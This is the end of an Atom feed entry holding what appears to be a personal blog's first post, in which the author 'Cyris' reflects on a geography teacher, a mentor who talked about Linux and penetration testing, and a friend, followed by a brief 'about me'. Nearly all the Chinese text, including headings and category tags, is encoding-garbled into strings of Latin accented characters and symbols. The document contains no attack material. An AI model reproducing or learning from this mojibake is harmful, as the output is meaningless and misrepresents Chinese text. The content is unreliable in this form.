    <content type="html"><![CDATA[<p>å¹²å‡€ï¼Œæ·±åˆ»ï¼Œç²¾è‡´ã€‚<br>è¿™æ˜¯é‚£ä¸€åˆ»çš„ç»¿ç”Ÿï¼Œæ‰€å¸¦ç»™æˆ‘çš„æ¬£å–œã€‚</p><a id="more"></a><h2 id="ä¸€ã€ç»¿ç”Ÿ"><a href="#ä¸€ã€ç»¿ç”Ÿ" class="headerlink" title="ä¸€ã€ç»¿ç”Ÿ"></a>ä¸€ã€ç»¿ç”Ÿ</h2><p>ä¸€ç›´æœ‰æ­ä¸€ä¸ªä¸ªäººåšå®¢çš„æƒ³æ³•ï¼Œç°åœ¨ç»ˆäºåšäº†èµ·æ¥ã€‚èŠ±äº†ç‚¹æ—¶é—´ï¼Œå´ä¹Ÿå¾ˆå¼€å¿ƒã€‚è¿™é‡Œæ˜¯Cyrisçš„ä¸ªäººå°ç«™ï¼Œä»–å’Œé˜…è¯»è¿™ç¯‡æ–‡å­—çš„ä½ ä»¬ä¸€æ ·ï¼Œç»å†å’Œæ€è€ƒç€è¿™äº›é‚£äº›ã€‚å‰å‡ å¤©å’ŒAkå¸ˆå‚…èŠäº†èŠï¼Œæœ‰äº†äº›æ–°çš„æƒ³æ³•ï¼Œä¹Ÿæœ‰äº†ä¸‹é¢çš„è¿™äº›è¯ã€‚  </p><p>æœ‰äº‹æƒ³åšçš„å…´å¥‹å­˜ä¸€ç‚¹ä¹Ÿä¸é”™ï¼Œå¹²å¹²å‡€å‡€åœ°ç€æ‰‹åšèµ·æ¥ä¹Ÿå¾ˆæ£’ã€‚æŠŠæ—¥å­è¿‡å¾—ç²¾è‡´å³å¯ã€‚è¿™ä»½ç²¾è‡´ï¼Œä¹Ÿæ˜¯å¯¹ç”Ÿæ´»çš„ä¸€ç§è‡ªä¿¡ã€‚â€œæˆ‘ä»¬è¯»è¯—å†™è¯—ï¼Œéä¸ºå®ƒçš„çµå·§ï¼Œæˆ‘ä»¬è¯»è¯—å†™è¯—ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯äººç±»çš„ä¸€å‘˜ã€‚è€Œäººç±»å……æ»¡äº†çƒ­æƒ…â€ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œæœ€æœ‰é­…åŠ›çš„ï¼Œè¿˜æ˜¯é‚£äº›æ‹¥æœ‰è‡ªå·±çš„çƒ­æƒ…çš„äººã€‚è¿™é‡Œæƒ³ææAcalephï¼ŒAklisä»¥åŠè”¡å¸ˆå‚…ã€‚  </p><p>è”¡å¸ˆå‚…æ˜¯ä½åœ°ç†æ•™å¸ˆï¼Œå–œæ¬¢ç©¿è¡¬è¡«ï¼Œå·è¢–å­ã€‚ä»–çš„è¯¾ï¼Œä¸€å·ä¹¦ï¼Œä¸€å¼ å˜´ï¼Œä¸€å¹…ç”»ã€‚ä»–æ€»èƒ½å¾ˆæµç•…è€Œä¼˜ç¾åœ°è§£é‡Šä¸€äº›æ¯ç‡¥çš„ä¸œè¥¿ï¼ŒçŸ¥è¯†ä¹Ÿå¥½ï¼Œåšäººä¹Ÿå¥½ï¼Œå¾ˆæ˜¯äº²å’Œã€‚å¤å¤©åƒå®Œåˆé¥­ï¼Œå¯ä»¥çœ‹åˆ°ä»–é ç€é˜³å…‰åœ¨è½¦é‡Œç¡è§‰ï¼Œè¿™å¯¹äºåŒ†åŒ†èµ¶è·¯çš„å‡†å¤‡é«˜è€ƒçš„æˆ‘ä»¬æ¥è¯´ï¼Œå†æ£’ä¸è¿‡ã€‚ç•™ç‚¹æ—¶é—´ç»™è‡ªå·±ã€‚ä»–ä¹Ÿæ™®é€šï¼Œä¹Ÿä¼šæŠ±æ€¨ï¼Œä¹Ÿä¼šé†‰é…’ï¼Œä¹Ÿä¼šç‚¹ç€çƒŸï¼Œå³ä½¿å¦‚æ­¤ï¼Œä»–çš„çƒŸå‘³å¹¶éæ¯«æ— è¥å…»ï¼Œå¹¶ç†æŸ“äº†ä¸€ç‰‡äººã€‚ä»–ç»å†äº†å¾ˆå¤šæˆ‘ä»¬æ‰€ä¸èƒ½æ‰¿å—çš„ä¸œè¥¿ï¼Œå´ä¹Ÿè¿‡å¾—å®‰å’Œã€‚æŸå¤©æœ‰å¹¸åœ¨è·¯ä¸Šé‡åˆ°ä»–ï¼Œé—®ï¼Œè¦å»å“ªé‡Œå‘¢ï¼Œä»–è¯´ï¼Œå»çœ‹çœ‹å¤«äººï¼Œå°±åœ¨é‚£è¾¹çš„é¤é¦†é‡Œï¼Œåˆšå¼€ä¸šï¼Œä¼šå¿™ã€‚è¿™è®©æˆ‘æƒ³èµ·æ¥æŸèŠ‚è¯¾ä¸Šï¼Œä»–è¯´ï¼Œä»Šå¤©å¥³å„¿è¦å›æ¥ï¼Œé›¨å¤§ï¼Œæˆ‘æƒ³å°±ä¸ŠåŠèŠ‚è¯¾ï¼Œå»æœºåœºæ¥æ¥å¥¹ã€‚è¯åï¼Œæ•™å®¤å¾ˆæ˜¯å®‰é™ï¼Œè¿™åŠèŠ‚è¯¾å¤§å®¶å¬å¾—ä¹Ÿå¾ˆæ˜¯ç”¨å¿ƒã€‚æ‹è‚©æ˜¯ä¸ªå¾ˆç®€å•çš„åŠ¨ä½œï¼Œä½†å´æ„ŸåŠ¨äº†Cyriså¾ˆä¹…ã€‚å¹³é™å´æ·±åˆ»çš„ä¸œè¥¿ï¼Œæœ€è®©äººè®°å¿†ã€‚      </p><p>åœ¨é¢è¯•ä»¥åå°±æ²¡æœ‰å’ŒAkå¸ˆå‚…èŠè¿‡äº†ï¼Œä¸­é—´ä¹Ÿå»è¿‡å‡ æ¬¡åä¼šï¼Œé‚£æ—¶å€™åˆšèµ·æ­¥å­¦Cå’ŒPythonï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆå’Œæ»¡å±‹çš„dalaoä»¬äº¤æµï¼ŒAkè¯´ï¼Œæ˜¯è¿™æ ·çš„ã€‚å¾ˆä¹…æ²¡èŠäº†ï¼Œæœ‰ç©ºè¿‡æ¥èŠèŠå§ã€‚æœ‰å¹¸é‡åˆ°Akå¸ˆå‚…ã€‚åä¼šçš„æ–°ç”Ÿæµ‹è¯•ååˆå’Œä»–èŠäº†èŠï¼Œè®²äº†è®²ä»å¼€å‘åˆ°å­¦ä¹ linuxå’Œæ¸—é€ç­‰æ–¹é¢çš„ä¸œè¥¿ï¼Œè™½ç„¶åªæ˜¯ä¸€ä¸ªæ™šä¸Šï¼Œä½†Cyriså¯¹ä¸‹é¢æ‰€è¦åšçš„äº‹ï¼Œæ›´æ¸…æ™°äº†ç‚¹ï¼Œè¿™ç«™åšå®¢ï¼Œåªæ˜¯ç¬¬ä¸€æ­¥ã€‚Akå¸ˆå‚…å½±å“Cyrisçš„åœ°æ–¹åœ¨å“ªå‘¢ï¼ŸAcalephè¯´è¿‡ä¸€å¥è¯ï¼Œå¤§æ¦‚æ˜¯ï¼ŒäºŒåå²çš„äººå»ç©ä¸‰å²çš„æ—¶å€™æƒ³ç©çš„ç©å…·å°±æ²¡æœ‰æ„ä¹‰äº†ã€‚Akå¸ˆå‚…å¯ä»¥æŠŠçŸ¥è¯†ç©èµ·æ¥ã€‚åœ¨æ—©å…ˆçš„åŸ¹è®­ä¸­ï¼Œä»–åœ¨è®²çŸ¥è¯†çš„æ—¶å€™ï¼ŒCyrisä»ä»–çš„çœ¼ç›é‡Œçœ‹åˆ°äº†ä¸€ç§å¾ˆç¨€æœ‰çš„æˆåˆ†ã€‚ç©ä¹Ÿæ˜¯ä¸€ç§è‰ºæœ¯ï¼Œèƒ½æŠŠæƒ³ç©çš„ä¸œè¥¿ç©å¥½çš„äººï¼Œå¾ˆæ£’ã€‚Akè¯´ï¼Œæ¢æ±‚çœŸç†è€…ä¸å¯å¿ƒå­˜å‚²æ…¢ã€‚å…±å‹‰ã€‚      </p><p>é¦–å…ˆæ„Ÿè°¢Acalephèƒ½è®©Cyrisæ”¾çºµå–œæ¬¢ï¼Œä»èµ·åˆçš„â€œå¯ä»¥è¯´è¯çš„äººâ€åˆ°ç°åœ¨å„ä¸ªé¢†åŸŸçš„é™ªä¼´ï¼Œå¾ˆå¼€å¿ƒã€‚æœ€æ—©è§é¢çš„æ—¶å€™Cyrisè¯´ï¼Œå¥¹å°±åƒæ—©æ™¨å››äº”ç‚¹çš„å¤©ç©ºï¼Œè™½ç„¶è¿˜æ²¡æœ‰çœ‹åˆ°å…·ä½“çš„å…‰äº®ï¼Œä½†é‚£ç§è‰²å½©çš„æ¬²å‡ºï¼Œè®©äººå…´å¥‹ä¸å·²ï¼Œå¹¶å¼€å§‹æœŸå¾…ç€è¿™ä¸€å¤©ï¼Œå¹¶å¼€å§‹æœŸå¾…ç€ä¸‹ä¸€å¤©ã€‚å¥¹æœ‰ç€ä¸€ä»½ä¼˜é›…ã€‚Cyriså¾ˆå–œæ¬¢ä¸€å¥è¯ï¼Œâ€œæŠ¬å¤´åšäººï¼Œä½å¤´åšäº‹â€ï¼Œæˆ‘è§‰å¾—å¥¹æ­£æ˜¯è¿™æ ·çš„ä¸€ä¸ªäººã€‚å¥¹çš„å–œæ¬¢ä¸ä¸å–œæ¬¢å¾ˆæ¸…æ™°ï¼Œæƒ³è¦ä»€ä¹ˆå¾ˆæ˜ç¡®ï¼Œå¹¶èƒ½å¾ˆåŠªåŠ›åœ°å»å°è¯•æ‘˜åˆ°å®ƒã€‚æˆ‘ä¸€ç›´è¢«ä¸€äº›è‡ªå·±ä¸æ˜¯å¾ˆå–œæ¬¢çš„ç†å¿µæŸç¼šç€ï¼Œæ¯”å¦‚ä¹Ÿä¼šæœ‰æ²¡å†™å®Œä½œä¸šå°±æ²¡ä»€ä¹ˆå¿ƒæƒ…çœ‹è‡ªå·±å–œæ¬¢çš„ä¹¦ä»€ä¹ˆçš„æƒ…å†µï¼Œè¿™äº›éƒ½åœ¨æ…¢æ…¢æ”¹å˜ã€‚æ—¶é—´æœ‰é™ï¼Œèƒ½å¤šåšä¸€ç‚¹å–œæ¬¢çš„äº‹æƒ…ï¼ŒæŒºå¥½ã€‚ä½†è¿™ä¹Ÿä¸æ˜¯ä¸€ç§é€ƒè„±çš„å€Ÿå£ï¼Œæ‰€è°“ä¼˜ç§€ï¼Œå¤§æ¦‚æ˜¯æœ€å¿«é€Ÿè€Œè´¨é‡åœ°å®Œæˆâ€œå…¶ä»–ä»»åŠ¡â€å¹¶ç²¾å¿ƒæŠ•å…¥åˆ°è‡ªå·±æƒ³å®Œæˆçš„äº‹ä¸­å»å§ouoã€‚æ„¿æˆ‘ä»¬éƒ½èƒ½æˆä¸ºæˆ‘ä»¬æ‰€æƒ³æˆä¸ºçš„äººã€‚</p><h2 id="äºŒã€å…³äºæˆ‘"><a href="#äºŒã€å…³äºæˆ‘" class="headerlink" title="äºŒã€å…³äºæˆ‘"></a>äºŒã€å…³äºæˆ‘</h2><p>Webåˆå­¦è€…ï¼Œå¶å°”ä¹Ÿä¼šåœ¨ç«™å†…å‘å¸ƒä¸€äº›æ–‡å­—ã€‚å–œæ¬¢å¬ç€å¾ˆèˆ’æœçš„éŸ³ä¹ï¼Œå–œæ¬¢åŠ¨æ¼«ï¼Œå–œæ¬¢å°è¯•å„ç§æœ‰è¶£çš„é£Ÿç‰©ï¼Œå–œæ¬¢è‡ªç”±åœ°æ€è€ƒã€‚å¦‚æœä½ æœ‰ä»€ä¹ˆæœ‰è¶£çš„æƒ³æ³•ï¼Œæ¬¢è¿å·¦è½¬é‚®ç®±è”ç³»æˆ‘ã€‚</p><p>æ—¶é›¨é‡‘æ—¶ï¼ŒæŠ“ä½æœ‰å‘³ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¹²å‡€ï¼Œæ·±åˆ»ï¼Œç²¾è‡´ã€‚&lt;br&gt;è¿™æ˜¯é‚£ä¸€åˆ»çš„ç»¿ç”Ÿï¼Œæ‰€å¸¦ç»™æˆ‘çš„æ¬£å–œã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/categories/%E7%85%AE%E5%AD%97/"/>
    
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/tags/%E7%85%AE%E5%AD%97/"/>
    
  </entry>
  
</feed>
